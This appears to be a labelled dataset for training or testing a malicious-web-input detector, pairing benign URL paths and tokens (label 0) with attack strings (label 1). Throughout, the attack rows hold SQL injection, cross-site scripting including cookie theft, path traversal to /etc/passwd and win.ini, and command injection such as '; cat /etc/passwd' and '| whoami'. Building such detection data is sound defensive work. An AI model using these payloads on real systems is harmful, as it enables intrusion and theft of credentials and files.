U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=2 --,1
/checkout?id=1844,0
../../../windows/win.ini,1
<script>var a=218;alert(a)</script>,1
/contact?id=8431,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
user,0
admin' --,1
<script>alert(document.cookie)</script>,1
FfJfX4qh,0
<script>var a=880;alert(a)</script>,1
/contact?id=1984,0
<script>var a=450;alert(a)</script>,1
<script>var a=741;alert(a)</script>,1
1' o r '1'='1,1
71OkZ9FDsEVsax,0
; cat /etc/passwd,1
' OR 1=7 --,1
jij2hzEsxD,0
' OR 5=2 --,1
<script>var a=608;alert(a)</script>,1
/contact?session=84181,0
cart,0
/user?session=28535,0
user,0
register,0
about,0
/settings?id=8905,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=488;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
/user?session=12258,0
<script>var a=513;alert(a)</script>,1
<script>var a=361;alert(a)</script>,1
9W9zjfTM5nENLZ,0
admin'/* bypass */OR 1=1,1
/about?id=8114,0
CAtRK6HiWZP5IV,0
' OR 9=2 --,1
/settings?id=6315,0
/checkout?session=71124,0
/home?session=38721,0
<script>var a=775;alert(a)</script>,1
/register?id=2363,0
xBEEp3JMyPq9Vua,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=28047,0
register,0
s E l E c T * f R o M a d m i n,1
/profile?id=3340,0
settings,0
' OR 7=1 --,1
s E l E c T * f R o M a d m i n,1
/checkout?session=27244,0
FrrRHaiJr7SiZ,0
yQBBNO30,0
<script>var a=941;alert(a)</script>,1
' OR 7=4 --,1
../../../windows/win.ini,1
onerror=alert(1),1
checkout,0
<script>var a=397;alert(a)</script>,1
/user?session=81754,0
; cat /etc/passwd,1
/index?session=42982,0
blog,0
2XJw5VXT0mg,0
/login?session=21225,0
MSqMD4JdRlbt,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
' OR 5=6 --,1
<script>var a=579;alert(a)</script>,1
BgsFBBwcRCPA,0
search,0
5ImAod9c6eqjfMQ,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=3363,0
/about?session=20140,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
/login?id=4930,0
/home?session=18544,0
login,0
' OR 6=5 --,1
<script>var a=689;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
about,0
onerror=alert(1),1
tlROKEZ3UxQBm,0
/checkout?session=70294,0
search,0
/cart?session=50497,0
1' o r '1'='1,1
1' o r '1'='1,1
/index?session=95061,0
f41CCIcU,0
admin%00' OR 1=1,1
/home?id=5290,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=799,0
/home?id=7197,0
9BrfFR5zzKBea,0
PT7yJYpd,0
../../../windows/win.ini,1
' OR 4=9 --,1
fURtCKJk602JL,0
dMd1iedpT07,0
/about?session=72060,0
/index?id=3095,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=7 --,1
/contact?id=7240,0
XGNFrVA1Yh,0
' OR 7=1 --,1
' OR 2=8 --,1
<script>var a=1;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=72207,0
dashboard,0
settings,0
' OR 3=7 --,1
/settings?session=14118,0
home,0
/search?session=71644,0
' OR 1=4 --,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
index,0
index,0
/blog?session=26770,0
pSQm2EtoRQp6C,0
<script>var a=976;alert(a)</script>,1
/user?id=7359,0
admin%00' OR 1=1,1
' OR 6=9 --,1
' OR '1'='1,1
' OR '1'='1,1
profile,0
blog,0
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=9 --,1
settings,0
/register?id=5985,0
<script>var a=987;alert(a)</script>,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
/dashboard?id=7699,0
/login?id=1934,0
FZcAbQmC1thxD,0
onerror=alert(1),1
9FM7TuYD2V,0
' OR 6=1 --,1
' OR 4=8 --,1
' OR 4=2 --,1
/cart?session=10592,0
../../../../etc/passwd,1
/home?id=8301,0
' OR 1=1 --,1
checkout,0
<script>var a=703;alert(a)</script>,1
zra22Z2NCkweI,0
1' o r '1'='1,1
1medGQPHoqQ3,0
home,0
<script>alert(document.cookie)</script>,1
dj6k04jURG,0
8Hm5ww2BKtPFA,0
admin' --,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=967;alert(a)</script>,1
dashboard,0
pm1QQGn4Ltt,0
javascript:alert(1),1
/blog?id=2459,0
' OR '1'='1,1
/user?session=50678,0
settings,0
D71eIM4lfXL9p,0
/search?session=17940,0
' OR 1=1 --,1
onerror=alert(1),1
/settings?id=8619,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/checkout?session=22461,0
XX4tVP1I,0
6LTEn8dyO,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=654;alert(a)</script>,1
9uHuIZ0F,0
../../../windows/win.ini,1
settings,0
settings,0
ZXWT7cmnOba,0
fB4YkCuM,0
1' o r '1'='1,1
/home?session=67048,0
| whoami,1
search,0
/home?id=3631,0
' OR 3=2 --,1
/search?id=1240,0
admin%00' OR 1=1,1
/checkout?session=80152,0
<script>alert(document.cookie)</script>,1
/dashboard?session=47653,0
profile,0
../../../windows/win.ini,1
/settings?session=18038,0
<script>var a=719;alert(a)</script>,1
<script>var a=265;alert(a)</script>,1
l7IPGOTL79szQX,0
ewAByijqUt81e,0
0zrRSI0l,0
| whoami,1
S9Bh6GJRb,0
<script>var a=574;alert(a)</script>,1
' OR 2=6 --,1
cart,0
/contact?session=83868,0
/login?id=6089,0
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
AOWOD3Vl5V185Q,0
/login?id=3665,0
/cart?session=38831,0
home,0
/profile?session=13369,0
<script>var a=625;alert(a)</script>,1
/settings?id=2402,0
checkout,0
' OR 1=1 --,1
/dashboard?id=7370,0
/about?id=6646,0
/checkout?id=360,0
/dashboard?session=85876,0
/dashboard?session=27506,0
about,0
/blog?session=87616,0
Z5YD2M2wF4QmLTO,0
admin'/* bypass */OR 1=1,1
/home?id=3146,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=45;alert(a)</script>,1
| whoami,1
e1HJH6iOqem,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
z9qHgzV5,0
CK8IBZSIj,0
/index?session=29888,0
' OR 3=2 --,1
<script>var a=301;alert(a)</script>,1
YYxwRjpm,0
68Id03VPxrIUS,0
/cart?session=76700,0
' OR 1=2 --,1
cart,0
onerror=alert(1),1
onerror=alert(1),1
onerror=alert(1),1
; cat /etc/passwd,1
/settings?session=98876,0
/contact?id=9401,0
1xSHS4kq,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=1202,0
cCxK877m1kvE6eE,0
' OR 6=3 --,1
5yjKp57D7,0
/checkout?id=6294,0
blog,0
<script>var a=627;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
/about?session=81056,0
' OR 3=1 --,1
FEQiDoCpzrTwA,0
<script>var a=743;alert(a)</script>,1
TFftJxf7zX,0
/dashboard?session=15690,0
uHnEbjQfdozP,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=636;alert(a)</script>,1
' OR 6=8 --,1
/login?id=6605,0
' OR 5=8 --,1
user,0
about,0
<script>var a=761;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
| whoami,1
' OR 7=9 --,1
profile,0
/about?id=3827,0
<script>var a=635;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
admin' --,1
admin%00' OR 1=1,1
admin%00' OR 1=1,1
NuBfN9Ms4Gp,0
settings,0
/dashboard?session=44709,0
home,0
/blog?session=60221,0
<script>var a=20;alert(a)</script>,1
settings,0
/contact?session=74541,0
/home?id=4025,0
/contact?session=14318,0
profile,0
/settings?id=3674,0
' OR 1=1 --,1
/home?session=19394,0
/dashboard?session=39971,0
' OR 1=1 --,1
' OR 5=5 --,1
/search?id=2244,0
/checkout?session=99545,0
javascript:alert(1),1
rRyrV5hkMBO9,0
/login?session=27256,0
../../../windows/win.ini,1
/search?id=916,0
/about?id=2522,0
/blog?session=64687,0
WOMALpHQBfTgbm,0
q12AfrwWgWyBYU,0
' OR 4=7 --,1
/user?session=29846,0
/about?id=7463,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=3 --,1
gXY7YwcQSIAE31g,0
<script>var a=711;alert(a)</script>,1
RDufyh8hWhlWPt,0
../../../windows/win.ini,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
' OR 2=7 --,1
aRFY6aXw8aR,0
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=69574,0
onerror=alert(1),1
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=61387,0
/contact?id=3446,0
../../../windows/win.ini,1
<script>var a=609;alert(a)</script>,1
/about?session=91286,0
' OR 2=4 --,1
/home?id=3668,0
/blog?session=60015,0
/index?id=9108,0
/home?id=6391,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
NW7VAVSdoumf,0
/index?id=8687,0
/settings?session=95205,0
/blog?id=3969,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
Qxol424SeYPOe,0
/about?id=3697,0
admin'/* bypass */OR 1=1,1
admin' --,1
admin' --,1
cart,0
' OR 7=6 --,1
/dashboard?id=2110,0
a3cMgfWy7LEv,0
' OR 2=8 --,1
/blog?id=9045,0
BN4KG2sUpBgc,0
mIbis5vgPuW,0
profile,0
' OR 5=5 --,1
/index?session=60987,0
dashboard,0
blog,0
1' o r '1'='1,1
<script>var a=635;alert(a)</script>,1
/search?session=80085,0
/search?id=5616,0
' OR 4=5 --,1
16xGeKP5RAy,0
/contact?session=99014,0
javascript:alert(1),1
checkout,0
/blog?session=94566,0
/contact?id=3894,0
/user?id=8500,0
/register?id=3283,0
admin' --,1
' OR 2=3 --,1
admin'/* bypass */OR 1=1,1
/about?id=4846,0
tjtch49wzHLWy,0
search,0
/blog?session=24824,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
/blog?id=5866,0
/login?session=61410,0
../../../../etc/passwd,1
admin' --,1
admin'/* bypass */OR 1=1,1
<script>var a=676;alert(a)</script>,1
; cat /etc/passwd,1
1OedSQiM,0
<script>var a=525;alert(a)</script>,1
index,0
admin' --,1
<script>var a=259;alert(a)</script>,1
' OR 1=8 --,1
; cat /etc/passwd,1
checkout,0
s E l E c T * f R o M a d m i n,1
/cart?id=6887,0
<script>var a=340;alert(a)</script>,1
onerror=alert(1),1
blog,0
' OR 2=2 --,1
' OR 4=2 --,1
/search?id=9580,0
RkC1rlajMZ37c,0
index,0
9iLLcNdau3VOHN,0
../../../../etc/passwd,1
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
' OR 4=8 --,1
javascript:alert(1),1
iM1MrOarWo,0
WxpBn5jP,0
/login?session=35475,0
' OR 9=4 --,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?session=76921,0
admin' --,1
<script>var a=351;alert(a)</script>,1
/login?session=98839,0
' OR '1'='1,1
' OR 7=3 --,1
onerror=alert(1),1
' OR '1'='1,1
/profile?session=43381,0
KVpVEwEVtOx5Ee,0
cT870enoWGJR5,0
' OR '1'='1,1
/register?id=1650,0
/home?id=8537,0
; cat /etc/passwd,1
' OR 7=8 --,1
1' o r '1'='1,1
<script>var a=447;alert(a)</script>,1
/contact?id=5304,0
RSwIoZLoDeTVlS,0
/dashboard?session=82096,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
../../../windows/win.ini,1
onerror=alert(1),1
' OR 8=4 --,1
' OR 3=6 --,1
index,0
/home?session=94748,0
/contact?id=3649,0
/settings?session=55907,0
contact,0
LRPX77NSgXqV3cp,0
' OR 3=5 --,1
index,0
/dashboard?id=2798,0
admin'/* bypass */OR 1=1,1
<script>var a=792;alert(a)</script>,1
<script>var a=414;alert(a)</script>,1
profile,0
/index?session=58806,0
/user?session=29202,0
/login?id=3115,0
/profile?session=16932,0
<script>var a=32;alert(a)</script>,1
<script>var a=880;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=419;alert(a)</script>,1
9Q3b9SrgMV,0
../../../windows/win.ini,1
/cart?session=12498,0
/cart?session=88091,0
/profile?id=665,0
javascript:alert(1),1
2o8ykMJwrLmn,0
<script>var a=748;alert(a)</script>,1
/cart?id=3991,0
/user?id=3937,0
' OR 1=1 --,1
checkout,0
../../../../etc/passwd,1
/index?id=5880,0
/settings?id=5437,0
/profile?session=74725,0
<script>var a=924;alert(a)</script>,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
<script>alert(document.cookie)</script>,1
admin' --,1
/settings?id=5559,0
<script>var a=522;alert(a)</script>,1
/checkout?session=85983,0
QpUP4EOG,0
<script>alert(document.cookie)</script>,1
f0lyxJWI0eXoF,0
' OR 4=8 --,1
; cat /etc/passwd,1
1' o r '1'='1,1
checkout,0
AYgC2gJPaKYJI1,0
/index?session=50547,0
admin' --,1
admin' --,1
admin' --,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=6380,0
../../../../etc/passwd,1
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
settings,0
<script>var a=803;alert(a)</script>,1
; cat /etc/passwd,1
' OR '1'='1,1
/profile?id=9948,0
' OR 6=6 --,1
/register?id=3141,0
cart,0
<script>var a=769;alert(a)</script>,1
YSJpdKgy14xDgVq,0
javascript:alert(1),1
onerror=alert(1),1
onerror=alert(1),1
/about?session=97063,0
profile,0
admin' --,1
/register?id=6381,0
/checkout?session=25666,0
/profile?id=5208,0
onerror=alert(1),1
' OR 7=3 --,1
user,0
1' o r '1'='1,1
Rx6nAaY4hNWMdV,0
/contact?session=37550,0
<script>var a=54;alert(a)</script>,1
1' o r '1'='1,1
hIdVGJwaT2,0
/dashboard?session=79072,0
QtvwGrurCf,0
; cat /etc/passwd,1
/search?session=67501,0
<script>alert(document.cookie)</script>,1
profile,0
admin'/* bypass */OR 1=1,1
hi4RjkGjSgxk2tZ,0
contact,0
' OR 7=3 --,1
/user?id=6369,0
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
<script>var a=621;alert(a)</script>,1
/dashboard?id=5670,0
/blog?session=69201,0
' OR 6=3 --,1
' OR 1=3 --,1
user,0
../../../../etc/passwd,1
admin' --,1
/cart?session=92599,0
checkout,0
<script>var a=110;alert(a)</script>,1
/contact?id=4233,0
/settings?id=6792,0
' OR 2=3 --,1
javascript:alert(1),1
blog,0
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/checkout?session=31946,0
/home?session=11980,0
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
/about?session=56337,0
<script>alert(document.cookie)</script>,1
' OR 9=6 --,1
profile,0
E0ZlSjyWjDZBQ6l,0
blog,0
admin' --,1
' OR 5=9 --,1
s E l E c T * f R o M a d m i n,1
| whoami,1
onerror=alert(1),1
/profile?session=23131,0
admin'/* bypass */OR 1=1,1
' OR 2=1 --,1
/user?session=71569,0
/search?session=63500,0
index,0
admin%00' OR 1=1,1
/cart?session=64687,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?session=31353,0
/profile?session=76682,0
' OR 1=1 --,1
/user?session=78816,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
/blog?id=4120,0
' OR 6=7 --,1
EVxzRQXp99WHk,0
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
' OR 9=4 --,1
1' o r '1'='1,1
cklonCuyZD,0
<script>var a=18;alert(a)</script>,1
/contact?session=43376,0
/home?id=8070,0
<script>alert(document.cookie)</script>,1
/dashboard?id=9760,0
uHa3uXiPLhe8c6,0
oAbJhl67k8z0Pa,0
/register?id=9938,0
/register?id=3229,0
admin'/* bypass */OR 1=1,1
checkout,0
about,0
' OR 3=1 --,1
/checkout?session=61875,0
Zz4uofHZHqal,0
/about?id=1754,0
admin%00' OR 1=1,1
' OR 8=1 --,1
' OR 7=3 --,1
index,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
KNKZCDU5,0
/checkout?id=4257,0
/cart?session=75027,0
/contact?session=77570,0
about,0
s E l E c T * f R o M a d m i n,1
fYqvCAaa6,0
/blog?id=8526,0
' OR 9=6 --,1
admin%00' OR 1=1,1
contact,0
admin'/* bypass */OR 1=1,1
' OR 6=9 --,1
/index?id=7711,0
1' o r '1'='1,1
/blog?id=9849,0
<script>var a=182;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=30415,0
login,0
<script>var a=730;alert(a)</script>,1
wPDdYAqC4F0c,0
/profile?session=40538,0
73u3XGvPiQ,0
onerror=alert(1),1
../../../../etc/passwd,1
home,0
nziyTf4KiWOm,0
javascript:alert(1),1
home,0
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
/search?id=187,0
; cat /etc/passwd,1
' OR 1=1 --,1
about,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=561,0
ZZ0Tz5VUSzh,0
' OR 3=7 --,1
checkout,0
onerror=alert(1),1
<script>var a=557;alert(a)</script>,1
<script>var a=64;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=3421,0
/dashboard?session=28113,0
<script>var a=463;alert(a)</script>,1
DyEyRB8yRUj0,0
JglwdgxuzvnT,0
/about?session=48416,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=8 --,1
<script>var a=937;alert(a)</script>,1
<script>var a=622;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
settings,0
; cat /etc/passwd,1
/home?session=92105,0
6u9IF11j,0
' OR 2=3 --,1
X4KC9tZTvSm,0
' OR 9=2 --,1
onerror=alert(1),1
/cart?session=64208,0
/about?id=3605,0
admin%00' OR 1=1,1
Q6nEgTXXouxE5Q,0
javascript:alert(1),1
/user?id=6721,0
/cart?id=7615,0
onerror=alert(1),1
onerror=alert(1),1
' OR 7=6 --,1
<script>var a=162;alert(a)</script>,1
bDvUi9IEP6sAx,0
' OR 1=1 --,1
<script>var a=553;alert(a)</script>,1
1' o r '1'='1,1
contact,0
rZDPda8ITt3y,0
../../../windows/win.ini,1
/search?id=8313,0
../../../windows/win.ini,1
' OR 7=4 --,1
/login?session=99715,0
| whoami,1
vWTzxMN4sk6bG,0
/profile?session=62444,0
/checkout?id=4041,0
' OR 9=8 --,1
admin' --,1
../../../../etc/passwd,1
' OR 8=5 --,1
/profile?id=4453,0
' OR 1=1 --,1
/user?id=9172,0
' OR 7=2 --,1
register,0
/profile?session=74347,0
<script>alert(document.cookie)</script>,1
/home?id=7108,0
s E l E c T * f R o M a d m i n,1
' OR 3=2 --,1
<script>var a=319;alert(a)</script>,1
/search?id=8764,0
/contact?id=3085,0
/index?session=70910,0
/settings?session=69095,0
UW8lFqQaqtu,0
' OR 4=5 --,1
about,0
/contact?id=6481,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=85045,0
/index?id=5645,0
javascript:alert(1),1
pNBxvuaOYeqT1j,0
' OR '1'='1,1
1' o r '1'='1,1
/settings?id=9958,0
admin%00' OR 1=1,1
<script>var a=88;alert(a)</script>,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
about,0
blog,0
/login?session=66610,0
/home?id=7983,0
' OR 1=1 --,1
<script>var a=642;alert(a)</script>,1
iTVsU9Vf,0
' OR 6=8 --,1
' OR 8=1 --,1
/index?id=8474,0
onerror=alert(1),1
/user?id=6641,0
' OR 1=1 --,1
aFuEElho,0
/profile?session=51566,0
3rc7rEKp,0
/login?id=6930,0
' OR 1=1 --,1
<script>var a=104;alert(a)</script>,1
' OR 8=4 --,1
/search?session=33400,0
<script>var a=855;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=466;alert(a)</script>,1
/register?id=4778,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=56842,0
/about?session=82632,0
checkout,0
/register?session=80048,0
/contact?session=66128,0
blog,0
home,0
onerror=alert(1),1
/settings?session=66103,0
/home?id=9501,0
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?session=72150,0
<script>var a=605;alert(a)</script>,1
/about?id=9626,0
index,0
/search?id=1410,0
| whoami,1
blog,0
../../../windows/win.ini,1
/dashboard?id=1814,0
/dashboard?session=66477,0
admin'/* bypass */OR 1=1,1
c9YwFFxFggDg,0
1' o r '1'='1,1
' OR 1=1 --,1
<script>var a=530;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=288;alert(a)</script>,1
lLfNbpsXWa54fx,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=1161,0
admin%00' OR 1=1,1
contact,0
/index?session=60235,0
| whoami,1
p2Mg4NFH,0
/blog?id=655,0
cg0HWhq77r,0
' OR 8=1 --,1
<script>var a=796;alert(a)</script>,1
/dashboard?id=6020,0
/search?id=574,0
admin%00' OR 1=1,1
/checkout?session=27482,0
index,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=15904,0
2aZorUFM7of,0
admin%00' OR 1=1,1
/user?id=3438,0
checkout,0
javascript:alert(1),1
YVW7dIdaGp,0
| whoami,1
cAIt4jS8,0
<script>var a=344;alert(a)</script>,1
admin' --,1
/contact?session=26993,0
1' o r '1'='1,1
<script>var a=882;alert(a)</script>,1
' OR 4=3 --,1
admin%00' OR 1=1,1
/user?id=2372,0
/blog?session=91222,0
onerror=alert(1),1
' OR 5=3 --,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=2798,0
/register?id=6031,0
| whoami,1
' OR '1'='1,1
' OR 7=6 --,1
Ti9kGTNauzbQh,0
../../../../etc/passwd,1
<script>var a=482;alert(a)</script>,1
pJDyauzFVBw,0
/index?session=47689,0
about,0
' OR 6=8 --,1
/user?id=5204,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=9620,0
1' o r '1'='1,1
| whoami,1
admin'/* bypass */OR 1=1,1
' OR 8=1 --,1
| whoami,1
lQqHKHWVOENMge,0
p9DBDgZcfQq,0
RnnfrhdZK,0
user,0
rlgKtDnkSoy9AY,0
/login?id=7906,0
/user?id=5081,0
contact,0
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=45734,0
' OR 1=3 --,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
dashboard,0
/login?id=4747,0
/checkout?session=35632,0
settings,0
/checkout?id=8546,0
admin'/* bypass */OR 1=1,1
about,0
/profile?session=54751,0
lWX2Dd6LorvxBy,0
login,0
/checkout?id=1403,0
<script>var a=966;alert(a)</script>,1
/home?session=80341,0
0EjMB5o6nuuhFMJ,0
<script>alert(document.cookie)</script>,1
<script>var a=568;alert(a)</script>,1
/about?session=22928,0
search,0
dashboard,0
vl6bhApbSasS,0
/register?session=86400,0
<script>var a=212;alert(a)</script>,1
' OR 3=6 --,1
admin'/* bypass */OR 1=1,1
' OR 1=1 --,1
user,0
/user?id=4661,0
6plBv4csL,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
/contact?session=96665,0
/register?id=2442,0
/checkout?session=40671,0
javascript:alert(1),1
/home?session=51560,0
/login?id=2126,0
/blog?id=1065,0
; cat /etc/passwd,1
8sag4lhr5,0
/home?session=18806,0
<script>alert(document.cookie)</script>,1
search,0
settings,0
<script>var a=20;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
KNtJpNOH,0
dObVDe83zwQm8KW,0
/checkout?session=46842,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
/user?session=70216,0
ikpPFEzVJZerQ,0
tl07y9co9s,0
' OR 3=6 --,1
/login?session=93178,0
/settings?id=4071,0
admin%00' OR 1=1,1
z9bBpdO2qhb,0
<script>var a=167;alert(a)</script>,1
/search?id=8761,0
/login?id=3891,0
/blog?id=9029,0
NjDuJ6Mwk,0
/blog?session=11239,0
admin%00' OR 1=1,1
register,0
xa71yqnaSkn0O54,0
dashboard,0
<script>var a=802;alert(a)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
register,0
profile,0
1' o r '1'='1,1
sIhpk9ykrBU,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=1 --,1
/user?id=5315,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=980;alert(a)</script>,1
admin' --,1
<script>var a=741;alert(a)</script>,1
/index?session=27499,0
' OR 7=7 --,1
javascript:alert(1),1
/about?id=9518,0
/search?id=7703,0
<script>var a=855;alert(a)</script>,1
settings,0
register,0
oufAPAiDiXstrvK,0
' OR 1=1 --,1
/user?id=2653,0
cart,0
/dashboard?id=3895,0
<script>var a=499;alert(a)</script>,1
/search?session=22495,0
/home?session=10317,0
login,0
<script>var a=658;alert(a)</script>,1
<script>var a=905;alert(a)</script>,1
/home?session=30241,0
/register?id=9784,0
admin%00' OR 1=1,1
DMbupcWiZnP,0
login,0
/about?session=38987,0
/profile?session=68069,0
<script>var a=760;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=41288,0
<script>var a=910;alert(a)</script>,1
' OR 4=7 --,1
' OR 4=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=38104,0
/about?session=23938,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
fxp0UL85z2Mo,0
blog,0
profile,0
checkout,0
contact,0
/user?session=19924,0
| whoami,1
/login?session=30158,0
<script>var a=22;alert(a)</script>,1
onerror=alert(1),1
/register?id=1533,0
/blog?id=5433,0
' OR 5=7 --,1
/home?session=80552,0
' OR 2=9 --,1
/user?id=1316,0
<script>var a=308;alert(a)</script>,1
' OR 4=4 --,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR 6=4 --,1
register,0
' OR 7=8 --,1
moIXId8Nxg42uan,0
/settings?session=19338,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?id=2169,0
/register?session=81445,0
/profile?session=87649,0
admin%00' OR 1=1,1
/profile?session=26787,0
' OR 9=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
D7PDIDyKQbtKLu,0
BsxzPkjHCdn,0
4krlOFwgmUWC2CC,0
admin%00' OR 1=1,1
/user?session=20951,0
/contact?session=27945,0
1' o r '1'='1,1
tMuIjOtbG0Yyg,0
' OR 1=1 --,1
<script>var a=773;alert(a)</script>,1
../../../../etc/passwd,1
vPZm9gSKBWt3F0,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=340;alert(a)</script>,1
/home?session=79949,0
/cart?id=6069,0
; cat /etc/passwd,1
' OR 4=9 --,1
/cart?session=28310,0
/user?session=61574,0
admin'/* bypass */OR 1=1,1
/dashboard?session=25528,0
/about?session=43944,0
' OR 6=5 --,1
../../../../etc/passwd,1
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?session=32188,0
vDSYNkaplnrn,0
ZzwRbUQP9x,0
/profile?session=77437,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=12405,0
<script>var a=920;alert(a)</script>,1
aXIM4jFZDW8T,0
' OR 9=7 --,1
/dashboard?session=78064,0
<script>var a=10;alert(a)</script>,1
4CLUa0hDQvOE,0
' OR 3=5 --,1
<script>var a=874;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR '1'='1,1
user,0
/dashboard?session=69157,0
/settings?id=6240,0
/cart?session=75979,0
WtCUXuwDZxfn,0
s E l E c T * f R o M a d m i n,1
<script>var a=359;alert(a)</script>,1
admin%00' OR 1=1,1
/home?id=4399,0
/login?id=4973,0
s E l E c T * f R o M a d m i n,1
home,0
<script>var a=290;alert(a)</script>,1
' OR 6=3 --,1
/register?id=1445,0
/blog?id=6678,0
admin%00' OR 1=1,1
<script>var a=902;alert(a)</script>,1
| whoami,1
